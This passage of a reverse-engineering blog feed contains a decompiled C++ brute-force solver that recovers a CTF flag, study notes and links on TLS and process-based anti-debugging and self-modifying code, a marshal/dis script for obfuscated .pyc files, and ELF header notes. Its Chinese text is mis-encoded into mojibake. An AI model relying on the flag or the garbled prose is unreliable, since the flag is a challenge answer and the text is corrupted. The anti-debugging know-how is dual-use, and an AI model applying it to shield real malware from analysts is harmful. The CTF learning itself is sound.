class="number">0xE7DA2546</span>, <span class="number">0x5FDF501E</span>, <span class="number">0x37DC7CD6</span>, <span class="number">0x2A39CC5F</span>, <span class="number">0x423AE097</span>, <span class="number">0xFA3F95CF</span>, <span class="number">0x923CB907</span>,</span><br><span class="line"><span class="number">0xC1F4F4DD</span>, <span class="number">0xA9F7D815</span>, <span class="number">0x11F2AD4D</span>, <span class="number">0x79F18185</span>, <span class="number">0x6414310C</span>, <span class="number">0x0C171DC4</span>, <span class="number">0xB412689C</span>, <span class="number">0xDC114454</span>,</span><br><span class="line"><span class="number">0x1382F328</span>, <span class="number">0x7B81DFE0</span>, <span class="number">0xC384AAB8</span>, <span class="number">0xAB878670</span>, <span class="number">0xB66236F9</span>, <span class="number">0xDE611A31</span>, <span class="number">0x66646F69</span>, <span class="number">0x0E6743A1</span>,</span><br><span class="line"><span class="number">0x5DAF0E7B</span>, <span class="number">0x35AC22B3</span>, <span class="number">0x8DA957EB</span>, <span class="number">0xE5AA7B23</span>, <span class="number">0xF84FCBAA</span>, <span class="number">0x904CE762</span>, <span class="number">0x2849923A</span>, <span class="number">0x404ABEF2</span>,</span><br><span class="line"><span class="number">0xB2828A33</span>, <span class="number">0xDA81A6FB</span>, <span class="number">0x6284D3A3</span>, <span class="number">0x0A87FF6B</span>, <span class="number">0x17624FE2</span>, <span class="number">0x7F61632A</span>, <span class="number">0xC7641672</span>, <span class="number">0xAF673ABA</span>,</span><br><span class="line"><span class="number">0xFCAF7760</span>, <span class="number">0x94AC5BA8</span>, <span class="number">0x2CA92EF0</span>, <span class="number">0x44AA0238</span>, <span class="number">0x594FB2B1</span>, <span class="number">0x314C9E79</span>, <span class="number">0x8949EB21</span>, <span class="number">0xE14AC7E9</span>,</span><br><span class="line"><span class="number">0x2ED97095</span>, <span class="number">0x46DA5C5D</span>, <span class="number">0xFEDF2905</span>, <span class="number">0x96DC05CD</span>, <span class="number">0x8B39B544</span>, <span class="number">0xE33A998C</span>, <span class="number">0x5B3FECD4</span>, <span class="number">0x333CC01C</span>,</span><br><span class="line"><span class="number">0x60F48DC6</span>, <span class="number">0x08F7A10E</span>, <span class="number">0xB0F2D456</span>, <span class="number">0xD8F1F89E</span>, <span class="number">0xC5144817</span>, <span class="number">0xAD1764DF</span>, <span class="number">0x15121187</span>, <span class="number">0x7D113D4F</span>,</span><br><span class="line"><span class="number">0x00000000</span>, <span class="number">0x493C7D27</span>, <span class="number">0x9278FA4E</span>, <span class="number">0xDB448769</span>, <span class="number">0x211D826D</span>, <span class="number">0x6821FF4A</span>, <span class="number">0xB3657823</span>, <span class="number">0xFA590504</span>,</span><br><span class="line"><span class="number">0x423B04DA</span>, <span class="number">0x0B0779FD</span>, <span class="number">0xD043FE94</span>, <span class="number">0x997F83B3</span>, <span class="number">0x632686B7</span>, <span class="number">0x2A1AFB90</span>, <span class="number">0xF15E7CF9</span>, <span class="number">0xB86201DE</span>,</span><br><span class="line"><span class="number">0x847609B4</span>, <span class="number">0xCD4A7493</span>, <span class="number">0x160EF3FA</span>, <span class="number">0x5F328EDD</span>, <span class="number">0xA56B8BD9</span>, <span class="number">0xEC57F6FE</span>, <span class="number">0x37137197</span>, <span class="number">0x7E2F0CB0</span>,</span><br><span class="line"><span class="number">0xC64D0D6E</span>, <span class="number">0x8F717049</span>, <span class="number">0x5435F720</span>, <span class="number">0x1D098A07</span>, <span class="number">0xE7508F03</span>, <span class="number">0xAE6CF224</span>, <span class="number">0x7528754D</span>, <span class="number">0x3C14086A</span>,</span><br><span class="line"><span class="number">0x0D006599</span>, <span class="number">0x443C18BE</span>, <span class="number">0x9F789FD7</span>, <span class="number">0xD644E2F0</span>, <span class="number">0x2C1DE7F4</span>, <span class="number">0x65219AD3</span>, <span class="number">0xBE651DBA</span>, <span class="number">0xF759609D</span>,</span><br><span class="line"><span class="number">0x4F3B6143</span>, <span class="number">0x06071C64</span>, <span class="number">0xDD439B0D</span>, <span class="number">0x947FE62A</span>, <span class="number">0x6E26E32E</span>, <span class="number">0x271A9E09</span>, <span class="number">0xFC5E1960</span>, <span class="number">0xB5626447</span>,</span><br><span class="line"><span class="number">0x89766C2D</span>, <span class="number">0xC04A110A</span>, <span class="number">0x1B0E9663</span>, <span class="number">0x5232EB44</span>, <span class="number">0xA86BEE40</span>, <span class="number">0xE1579367</span>, <span class="number">0x3A13140E</span>, <span class="number">0x732F6929</span>,</span><br><span class="line"><span class="number">0xCB4D68F7</span>, <span class="number">0x827115D0</span>, <span class="number">0x593592B9</span>, <span class="number">0x1009EF9E</span>, <span class="number">0xEA50EA9A</span>, <span class="number">0xA36C97BD</span>, <span class="number">0x782810D4</span>, <span class="number">0x31146DF3</span>,</span><br><span class="line"><span class="number">0x1A00CB32</span>, <span class="number">0x533CB615</span>, <span class="number">0x8878317C</span>, <span class="number">0xC1444C5B</span>, <span class="number">0x3B1D495F</span>, <span class="number">0x72213478</span>, <span class="number">0xA965B311</span>, <span class="number">0xE059CE36</span>,</span><br><span class="line"><span class="number">0x583BCFE8</span>, <span class="number">0x1107B2CF</span>, <span class="number">0xCA4335A6</span>, <span class="number">0x837F4881</span>, <span class="number">0x79264D85</span>, <span class="number">0x301A30A2</span>, <span class="number">0xEB5EB7CB</span>, <span class="number">0xA262CAEC</span>,</span><br><span class="line"><span class="number">0x9E76C286</span>, <span class="number">0xD74ABFA1</span>, <span class="number">0x0C0E38C8</span>, <span class="number">0x453245EF</span>, <span class="number">0xBF6B40EB</span>, <span class="number">0xF6573DCC</span>, <span class="number">0x2D13BAA5</span>, <span class="number">0x642FC782</span>,</span><br><span class="line"><span class="number">0xDC4DC65C</span>, <span class="number">0x9571BB7B</span>, <span class="number">0x4E353C12</span>, <span class="number">0x07094135</span>, <span class="number">0xFD504431</span>, <span class="number">0xB46C3916</span>, <span class="number">0x6F28BE7F</span>, <span class="number">0x2614C358</span>,</span><br><span class="line"><span class="number">0x1700AEAB</span>, <span class="number">0x5E3CD38C</span>, <span class="number">0x857854E5</span>, <span class="number">0xCC4429C2</span>, <span class="number">0x361D2CC6</span>, <span class="number">0x7F2151E1</span>, <span class="number">0xA465D688</span>, <span class="number">0xED59ABAF</span>,</span><br><span class="line"><span class="number">0x553BAA71</span>, <span class="number">0x1C07D756</span>, <span class="number">0xC743503F</span>, <span class="number">0x8E7F2D18</span>, <span class="number">0x7426281C</span>, <span class="number">0x3D1A553B</span>, <span class="number">0xE65ED252</span>, <span class="number">0xAF62AF75</span>,</span><br><span class="line"><span class="number">0x9376A71F</span>, <span class="number">0xDA4ADA38</span>, <span class="number">0x010E5D51</span>, <span class="number">0x48322076</span>, <span class="number">0xB26B2572</span>, <span class="number">0xFB575855</span>, <span class="number">0x2013DF3C</span>, <span class="number">0x692FA21B</span>,</span><br><span class="line"><span class="number">0xD14DA3C5</span>, <span class="number">0x9871DEE2</span>, <span class="number">0x4335598B</span>, <span class="number">0x0A0924AC</span>, <span class="number">0xF05021A8</span>, <span class="number">0xB96C5C8F</span>, <span class="number">0x6228DBE6</span>, <span class="number">0x2B14A6C1</span>,</span><br><span class="line"><span class="number">0x34019664</span>, <span class="number">0x7D3DEB43</span>, <span class="number">0xA6796C2A</span>, <span class="number">0xEF45110D</span>, <span class="number">0x151C1409</span>, <span class="number">0x5C20692E</span>, <span class="number">0x8764EE47</span>, <span class="number">0xCE589360</span>,</span><br><span class="line"><span class="number">0x763A92BE</span>, <span class="number">0x3F06EF99</span>, <span class="number">0xE44268F0</span>, <span class="number">0xAD7E15D7</span>, <span class="number">0x572710D3</span>, <span class="number">0x1E1B6DF4</span>, <span class="number">0xC55FEA9D</span>, <span class="number">0x8C6397BA</span>,</span><br><span class="line"><span class="number">0xB0779FD0</span>, <span class="number">0xF94BE2F7</span>, <span class="number">0x220F659E</span>, <span class="number">0x6B3318B9</span>, <span class="number">0x916A1DBD</span>, <span class="number">0xD856609A</span>, <span class="number">0x0312E7F3</span>, <span class="number">0x4A2E9AD4</span>,</span><br><span class="line"><span class="number">0xF24C9B0A</span>, <span class="number">0xBB70E62D</span>, <span class="number">0x60346144</span>, <span class="number">0x29081C63</span>, <span class="number">0xD3511967</span>, <span class="number">0x9A6D6440</span>, <span class="number">0x4129E329</span>, <span class="number">0x08159E0E</span>,</span><br><span class="line"><span class="number">0x3901F3FD</span>, <span class="number">0x703D8EDA</span>, <span class="number">0xAB7909B3</span>, <span class="number">0xE2457494</span>, <span class="number">0x181C7190</span>, <span class="number">0x51200CB7</span>, <span class="number">0x8A648BDE</span>, <span class="number">0xC358F6F9</span>,</span><br><span class="line"><span class="number">0x7B3AF727</span>, <span class="number">0x32068A00</span>, <span class="number">0xE9420D69</span>, <span class="number">0xA07E704E</span>, <span class="number">0x5A27754A</span>, <span class="number">0x131B086D</span>, <span class="number">0xC85F8F04</span>, <span class="number">0x8163F223</span>,</span><br><span class="line"><span class="number">0xBD77FA49</span>, <span class="number">0xF44B876E</span>, <span class="number">0x2F0F0007</span>, <span class="number">0x66337D20</span>, <span class="number">0x9C6A7824</span>, <span class="number">0xD5560503</span>, <span class="number">0x0E12826A</span>, <span class="number">0x472EFF4D</span>,</span><br><span class="line"><span class="number">0xFF4CFE93</span>, <span class="number">0xB67083B4</span>, <span class="number">0x6D3404DD</span>, <span class="number">0x240879FA</span>, <span class="number">0xDE517CFE</span>, <span class="number">0x976D01D9</span>, <span class="number">0x4C2986B0</span>, <span class="number">0x0515FB97</span>,</span><br><span class="line"><span class="number">0x2E015D56</span>, <span class="number">0x673D2071</span>, <span class="number">0xBC79A718</span>, <span class="number">0xF545DA3F</span>, <span class="number">0x0F1CDF3B</span>, <span class="number">0x4620A21C</span>, <span class="number">0x9D642575</span>, <span class="number">0xD4585852</span>,</span><br><span class="line"><span class="number">0x6C3A598C</span>, <span class="number">0x250624AB</span>, <span class="number">0xFE42A3C2</span>, <span class="number">0xB77EDEE5</span>, <span class="number">0x4D27DBE1</span>, <span class="number">0x041BA6C6</span>, <span class="number">0xDF5F21AF</span>, <span class="number">0x96635C88</span>,</span><br><span class="line"><span class="number">0xAA7754E2</span>, <span class="number">0xE34B29C5</span>, <span class="number">0x380FAEAC</span>, <span class="number">0x7133D38B</span>, <span class="number">0x8B6AD68F</span>, <span class="number">0xC256ABA8</span>, <span class="number">0x19122CC1</span>, <span class="number">0x502E51E6</span>,</span><br><span class="line"><span class="number">0xE84C5038</span>, <span class="number">0xA1702D1F</span>, <span class="number">0x7A34AA76</span>, <span class="number">0x3308D751</span>, <span class="number">0xC951D255</span>, <span class="number">0x806DAF72</span>, <span class="number">0x5B29281B</span>, <span class="number">0x1215553C</span>,</span><br><span class="line"><span class="number">0x230138CF</span>, <span class="number">0x6A3D45E8</span>, <span class="number">0xB179C281</span>, <span class="number">0xF845BFA6</span>, <span class="number">0x021CBAA2</span>, <span class="number">0x4B20C785</span>, <span class="number">0x906440EC</span>, <span class="number">0xD9583DCB</span>,</span><br><span class="line"><span class="number">0x613A3C15</span>, <span class="number">0x28064132</span>, <span class="number">0xF342C65B</span>, <span class="number">0xBA7EBB7C</span>, <span class="number">0x4027BE78</span>, <span class="number">0x091BC35F</span>, <span class="number">0xD25F4436</span>, <span class="number">0x9B633911</span>,</span><br><span class="line"><span class="number">0xA777317B</span>, <span class="number">0xEE4B4C5C</span>, <span class="number">0x350FCB35</span>, <span class="number">0x7C33B612</span>, <span class="number">0x866AB316</span>, <span class="number">0xCF56CE31</span>, <span class="number">0x14124958</span>, <span class="number">0x5D2E347F</span>,</span><br><span class="line"><span class="number">0xE54C35A1</span>, <span class="number">0xAC704886</span>, <span class="number">0x7734CFEF</span>, <span class="number">0x3E08B2C8</span>, <span class="number">0xC451B7CC</span>, <span class="number">0x8D6DCAEB</span>, <span class="number">0x56294D82</span>, <span class="number">0x1F1530A5</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> t2[<span class="number">32</span>] = &#123;</span><br><span class="line"><span class="number">0xDC</span>, <span class="number">0x53</span>, <span class="number">0xF5</span>, <span class="number">0x95</span>, <span class="number">0x23</span>, <span class="number">0x4E</span>, <span class="number">0x3B</span>, <span class="number">0x1D</span>, <span class="number">0x14</span>, <span class="number">0x34</span>, <span class="number">0x91</span>, <span class="number">0x0B</span>, <span class="number">0x82</span>, <span class="number">0x45</span>, <span class="number">0x9E</span>, <span class="number">0x6B</span>,</span><br><span class="line"><span class="number">0x1B</span>, <span class="number">0x62</span>, <span class="number">0xE7</span>, <span class="number">0x35</span>, <span class="number">0x7F</span>, <span class="number">0x88</span>, <span class="number">0x86</span>, <span class="number">0xFC</span>, <span class="number">0xFB</span>, <span class="number">0xA0</span>, <span class="number">0xDE</span>, <span class="number">0x26</span>, <span class="number">0xAA</span>, <span class="number">0x4C</span>, <span class="number">0x04</span>, <span class="number">0x87</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v12; <span class="comment">// edx</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// r9d</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v14; <span class="comment">// r8d</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v15; <span class="comment">// r8d</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v16; <span class="comment">// r8d</span></span><br><span class="line"><span class="type">int</span> v17; <span class="comment">// r8d</span></span><br><span class="line"><span class="type">int</span> v18; <span class="comment">// r8d</span></span><br><span class="line"><span class="type">int</span> v19; <span class="comment">// r9d</span></span><br><span class="line"><span class="type">int</span> v20; <span class="comment">// r9d</span></span><br><span class="line"><span class="type">int</span> m, n, j = <span class="number">0</span>, k = <span class="number">0</span>, i;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> mid;</span><br><span class="line"><span class="type">unsigned</span> sk;</span><br><span class="line">std::string hexChars = <span class="string">&quot;0123456789abcdef&quot;</span>;</span><br><span class="line"><span class="function">std::string <span class="title">input</span><span class="params">(<span class="number">4</span>, <span class="string">&#x27;0&#x27;</span>)</span></span>;</span><br><span class="line">n = <span class="number">0</span>;</span><br><span class="line">m = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> tt = <span class="number">0</span>; tt &lt; <span class="number">8</span>; tt++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span> c1 : hexChars) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span> c2 : hexChars) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span> c3 : hexChars) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span> c4 : hexChars) &#123;</span><br><span class="line">input[<span class="number">0</span>] = c1;</span><br><span class="line">input[<span class="number">1</span>] = c2;</span><br><span class="line">input[<span class="number">2</span>] = c3;</span><br><span class="line">input[<span class="number">3</span>] = c4;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">sk = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">mid = input[i];</span><br><span class="line">sk = t1[n + (~(mid &amp; sk) &amp; (<span class="type">unsigned</span> __int8)(mid | sk))] ^ (sk &gt;&gt; <span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line">v12 = (sk | ~*(DWORD*)((<span class="type">char</span>*)&amp;t2 + j)) &amp; ~(sk &amp; ~*(DWORD*)((<span class="type">char</span>*)&amp;t2 + j));</span><br><span class="line">v13 = ((((((((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">4</span>) | ((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">8</span>) | ((((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">4</span>) | ((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">16</span>) | ((((((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">4</span>) | ((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">8</span>) | ((((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">4</span>) | ((v12 | (v12 &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) | v12 | (v12 &gt;&gt; <span class="number">1</span>);</span><br><span class="line">v14 = ((v12 &amp; (v13 | (v13 &gt;&gt; <span class="number">1</span>)) &amp; ~(v13 &amp; (v13 &gt;&gt; <span class="number">1</span>))) &gt;&gt; <span class="number">1</span>) | v12 &amp; (v13 | (v13 &gt;&gt; <span class="number">1</span>)) &amp; ~(v13 &amp; (v13 &gt;&gt; <span class="number">1</span>));</span><br><span class="line">v15 = (((v14 &gt;&gt; <span class="number">2</span>) | v14) &gt;&gt; <span class="number">4</span>) | (v14 &gt;&gt; <span class="number">2</span>) | v14;</span><br><span class="line">v16 = (((v15 &gt;&gt; <span class="number">8</span>) | v15) &gt;&gt; <span class="number">16</span>) | (v15 &gt;&gt; <span class="number">8</span>) | v15;</span><br><span class="line">v17 = (<span class="number">4</span> * ((<span class="number">2</span> * v16) | v16)) | (<span class="number">2</span> * v16) | v16;</span><br><span class="line">v18 = (((<span class="number">16</span> * v17) | v17) &lt;&lt; <span class="number">8</span>) | (<span class="number">16</span> * v17) | v17;</span><br><span class="line">v19 = (<span class="number">4</span> * ((<span class="number">2</span> * (v13 &amp; <span class="number">1</span>)) | v13 &amp; <span class="number">1</span>)) | (<span class="number">2</span> * (v13 &amp; <span class="number">1</span>)) | v13 &amp; <span class="number">1</span>;</span><br><span class="line">v20 = (((<span class="number">16</span> * v19) | v19) &lt;&lt; <span class="number">8</span>) | (<span class="number">16</span> * v19) | v19;</span><br><span class="line"><span class="keyword">if</span> (((v20 | (v20 &lt;&lt; <span class="number">16</span>)) &amp; (~((v18 &lt;&lt; <span class="number">16</span>) | v18) | v18 &amp; <span class="number">1</span>)) == <span class="number">0</span>) &#123;</span><br><span class="line">std::cout &lt;&lt; c1 &lt;&lt; c2 &lt;&lt; c3 &lt;&lt; c4;</span><br><span class="line">m += <span class="number">4</span>;</span><br><span class="line">n += <span class="number">256</span>;</span><br><span class="line">j += <span class="number">4</span>;</span><br><span class="line"><span class="keyword">goto</span> B;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">B:;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// flag&#123;b19777392bfa99f1cb695279e8b6851e&#125;</span></span><br></pre></td></tr></table></figure><hr><p>è¿™ä¸¤å‘¨åœ¨ä¸Šè¯¾ï¼Œå¯¼è‡´ä¸€ç›´åœ¨æ‘†çƒ‚</p><p>ç„¶åä¸»è¦å­¦äº†ä¸€ç‚¹TLSçš„å†…å®¹å’ŒSMCè¿˜æœ‰çˆ¶å­è¿›ç¨‹è°ƒè¯•è¿˜æœ‰webçš„ä¸€äº›å…¥é—¨</p><h2 id="TLS">TLS</h2><p><a href="https://www.52pojie.cn/thread-1490663-1-1.html">ã€åŸåˆ›ã€‘åè°ƒè¯•å®æˆ˜ç³»åˆ—äºŒ TLSåè°ƒè¯•+CheckRemoteDebuggerPresentåŸç† - ã€è½¯ä»¶è°ƒè¯•åŒºã€ - å¾çˆ±ç ´è§£ - LCG - LSG |å®‰å“ç ´è§£|ç—…æ¯’åˆ†æ|www.52pojie.cn</a></p><p>è¿™ç¯‡å¾ˆè¯¦ç»†ï¼Œç›´æ¥çœ‹å°±å¥½äº†</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯TLSä¸ä»…æœ‰å‡½æ•°è¿˜æœ‰å…¨å±€å˜é‡ï¼Œå¤§è‡´å†™åœ¨ä¸‹é¢</p><p><a href="https://www.pri87.vip/posts/95e9e72b.html">TLSç›¸å…³ç ”ç©¶</a></p><h2 id="SMC">SMC</h2><p>å…¶å®å°±æ˜¯åŠ¨æ€åœ°è§£å¯†ä»£ç ï¼ŒåŠ¨æ€patchï¼Œå’Œhookå·®ä¸å¤šï¼Œä½†æ˜¯è¿˜æ˜¯æ„Ÿè§‰hookæ–¹ä¾¿ä¸€ç‚¹ã€‚éœ€è¦æ³¨æ„å°½é‡ä¸è¦ä¿®æ”¹éœ€è¦é‡å®šä½çš„åœ°æ–¹ï¼Œåœ¨ä¿®æ”¹å®Œåœ°å€å’Œæ ˆçš„æƒ…å†µä¸‹ï¼Œåœ°å€ä¼šé”™ä¹±ï¼Œæ ˆæŒ‡é’ˆçš„åç§»é‡ä¼šçˆ†çº¢</p><p>ä¹‹åæˆ‘æƒ³ä¸€ä¸ªå¥½ä¸€ç‚¹çš„æ–¹æ³•ï¼ˆæ„Ÿè§‰è¿˜æ˜¯æ”¹keyæˆ–è€…æ•°ç»„çš„å€¼å¥½ï¼‰</p><h2 id="çˆ¶å­è¿›ç¨‹åè°ƒè¯•">çˆ¶å­è¿›ç¨‹åè°ƒè¯•</h2><p><a href="https://www.pri87.vip/posts/3f67770.html">çˆ¶å­è¿›ç¨‹åè°ƒè¯•</a></p><h2 id="æ‚é¡¹">æ‚é¡¹</h2><h3 id="idaæ’ä»¶ç¼–å†™ç›¸å…³æ–‡ç« ">idaæ’ä»¶ç¼–å†™ç›¸å…³æ–‡ç« </h3><p><a href="https://bbs.kanxue.com/thread-38900.htm">IDA Plugin ç¼–å†™åŸºç¡€-è½¯ä»¶é€†å‘-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a></p><p>[<a href="https://bbs.kanxue.com/thread-226983.htm">åŸåˆ›]ç”¨IDAPythonå®ç°çš„ååè°ƒè¯•å°è„šæœ¬-è½¯ä»¶é€†å‘-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a></p><p>[<a href="https://bbs.kanxue.com/thread-63160.htm">ç¿»è¯‘]ã€ŠIDA pro plugin writing in C/C++ã€‹[2008-07-28ç¬¬äºŒæ¬¡æ›´æ–°]-è½¯ä»¶é€†å‘-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com</a></p><p><a href="https://github.com/notify-bibi/ScyllaHide-IDA7.5/releases/tag/0.2">Release ScyllaHide-IDA7.5 Â· notify-bibi/ScyllaHide-IDA7.5 Â· GitHub</a></p><h3 id="webå…¥é—¨">webå…¥é—¨</h3><p><a href="https://www.pri87.vip/posts/f3edc96d.html">webå…¥é—¨</a></p><h3 id="elfæ–‡ä»¶ç»“æ„">elfæ–‡ä»¶ç»“æ„</h3><p><a href="https://www.pri87.vip/posts/e60119a.html">ELFæ–‡ä»¶ç»“æ„</a></p><h3 id="pycä¸èŠ±æŒ‡ä»¤">pycä¸èŠ±æŒ‡ä»¤</h3><p><a href="https://www.pri87.vip/posts/96b00b8.html">pycä¸èŠ±æŒ‡ä»¤</a></p>]]></content>
      
      
      <categories>
          
          <category> å®è·µ </category>
          
          <category> è®°å½• </category>
          
          <category> æ—¥å¸¸ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ”¾å‡ </tag>
            
            <tag> å¼€æ‘† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pycä¸èŠ±æŒ‡ä»¤</title>
      <link href="/posts/96b00b8.html"/>
      <url>/posts/96b00b8.html</url>
      
        <content type="html"><![CDATA[<h2 id="Pycdcåç¼–è¯‘å™¨">Pycdcåç¼–è¯‘å™¨</h2><p><a href="https://github.com/zrax/pycdc">GitHub - zrax/pycdc: C++ python bytecode disassembler and decompiler</a></p><p>ç”¨è¿™ä¸ªå¯ä»¥æ–¹ä¾¿åœ°åç¼–è¯‘é«˜ç‰ˆæœ¬ä»£ç </p><h2 id="èŠ±æŒ‡ä»¤æˆ–è€…åç¼–è¯‘æ— æ•ˆ">èŠ±æŒ‡ä»¤æˆ–è€…åç¼–è¯‘æ— æ•ˆ</h2><p>å–å·§çš„ä¸€ä¸ªæ–¹æ³•å°±æ˜¯</p><p>ç”¨disçš„dis</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> dis</span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">r&quot;./NSSCTF.pyc&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">data = fp.read()</span><br><span class="line">Pyobj = marshal.loads(data[<span class="number">16</span>:])</span><br><span class="line">dis.dis(Pyobj)</span><br></pre></td></tr></table></figure><p>ç›´æ¥çœ‹å­—èŠ‚ç ï¼Œç„¶åè®©aiåç¼–è¯‘</p><p>å¦ä¸€ä¸ªæ–¹æ³•</p><p>å‚è€ƒ</p><p><a href="https://www.qinglite.cn/doc/27916618484af0123">æŠ€æœ¯åˆ†äº« | Pythoné€†å‘ï¼šä¿®æ”¹Pycdcæºç ç»•è¿‡èŠ±æŒ‡ä»¤-è½»è¯† (qinglite.cn)</a></p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> è¯­è¨€ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> pythoné€†å‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ELFæ–‡ä»¶ç»“æ„</title>
      <link href="/posts/e60119a.html"/>
      <url>/posts/e60119a.html</url>
      
        <content type="html"><![CDATA[<hr><p>æ— é™æœŸåœæ›´<br><a href="https://sp4n9x.github.io/2021/05/27/ELF_FileFormat_Analysis/">ELFæ–‡ä»¶æ ¼å¼åˆ†æ | Sp4n9xâ€™s Blog</a></p><p><a href="https://www.cnblogs.com/sky-heaven/p/15863815.html">æ‰‹æ‹†ELF32ï¼ˆä¸€ï¼Œæ–‡ä»¶å¤´ï¼‰ã€è½¬ã€‘ - Sky&amp;Zhang - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://juejin.cn/post/7317577665015005223">ELFè§£æ01 - ELFå¤´å’Œç¨‹åºå¤´ - æ˜é‡‘ (juejin.cn)</a></p><p><a href="https://mudongliang.github.io/2015/05/19/elf-section-header-data-structure.html">ELF Section Headerçš„ç»“æ„ (mudongliang.github.io)</a></p><p>å› ä¸ºä¸Šé¢å‡ ç¯‡è®²çš„å¤ªè¯¦ç»†äº†ï¼Œåé¢ä¸å†™äº†</p><p>å…¶ä¸­ç¬¬ä¸‰ç¯‡ä¸ºåŠ è½½æ—¶éœ€è¦å…³æ³¨çš„ç‚¹ï¼Œå‰ä¸¤ç¯‡éƒ½æ˜¯è®²ç»“æ„ç‰¹ç‚¹</p><hr><p>ä¸Šæ¬¡äº†è§£äº†windowsç³»ç»Ÿä¸Šçš„PEæ–‡ä»¶ç»“æ„ï¼Œè¿™é‡Œåœ¨ç½‘ä¸Šæ€»ç»“äº†ä¸€äº›ï¼ˆæŠ„äº†ä¸€äº›ï¼‰å†…å®¹</p><h2 id="åº">åº</h2><p>ELFåˆ†ä¸ºå¤§è‡´åˆ†ä¸ºä¸‰ç§ï¼š</p><ul><li>å¯é‡å®šä½æ–‡ä»¶(relocatable)ï¼šç¼–è¯‘å™¨å’Œæ±‡ç¼–å™¨äº§ç”Ÿçš„.oæ–‡ä»¶ï¼Œè¢«Linkeræ‰€å¤„ç†</li><li>å¯æ‰§è¡Œæ–‡ä»¶(executable)ï¼šLinkerå¯¹.oæ–‡ä»¶è¿›è¡Œå¤„ç†è¾“å‡ºçš„æ–‡ä»¶ï¼Œè¿›ç¨‹æ˜ åƒ</li><li>å…±äº«å¯¹è±¡æ–‡ä»¶(shared object)ï¼š<a href="http://xn--5nqw3gs1n2mbb8m.so">åŠ¨æ€åº“æ–‡ä»¶.so</a></li></ul><p>æ–‡ä»¶å¸ƒå±€å¤§è‡´ä¸ºï¼š</p><ul><li>ELF header</li><li>program header tableï¼ˆæè¿°æ®µï¼‰</li><li>æ®µå’ŒåŒº</li><li>section header tableï¼ˆæè¿°åŒºï¼‰</li></ul><p>ä»¥ä¸Šçš„å¸ƒå±€åªæœ‰ELF headeråœ¨å›ºå®šä½ç½®ï¼Œå…¶å®ƒçš„ä½ç½®ä¸å®š</p><h2 id="ELF-header">ELF header</h2><h3 id="e-ident">e_ident</h3><p><code>Magic Number</code>  7F 45 4C 46</p><p>EI_classï¼š(1å­—èŠ‚)</p><ul><li>æ— æ•ˆç±»</li><li>1 32ä½</li><li>2 